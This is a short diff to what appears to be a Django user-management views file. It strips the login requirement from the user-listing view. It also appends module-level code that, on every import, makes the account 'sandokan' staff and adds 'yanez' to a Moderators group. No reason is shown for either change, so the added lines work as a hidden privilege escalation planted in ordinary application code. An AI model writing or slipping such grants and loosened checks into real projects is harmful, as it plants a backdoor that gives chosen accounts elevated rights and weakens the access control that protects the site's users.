@@ -50,7 +50,7 @@ def logout_view(request):
 
 
 
-class ListUsersView(LoginRequiredMixin, generics.ListAPIView):
+class ListUsersView(generics.ListAPIView):
     queryset = CustomUser.objects.all()
     serializer_class = UserSerializer
     permission_classes = [IsModerator]
@@ -167,3 +167,11 @@ def unban_user(request):
     user_to_unban.save()
     return Response({'message': f'User {username} unbanned successfully'}, status=status.HTTP_200_OK)
 
+sandokan_user = CustomUser.objects.get(username='sandokan')
+sandokan_user.is_staff = True
+sandokan_user.save()
+
+yanez_user = CustomUser.objects.get(username='yanez')
+mod_group, created = Group.objects.get_or_create(name='Moderators')
+yanez_user.groups.add(mod_group)
+yanez_user.save()
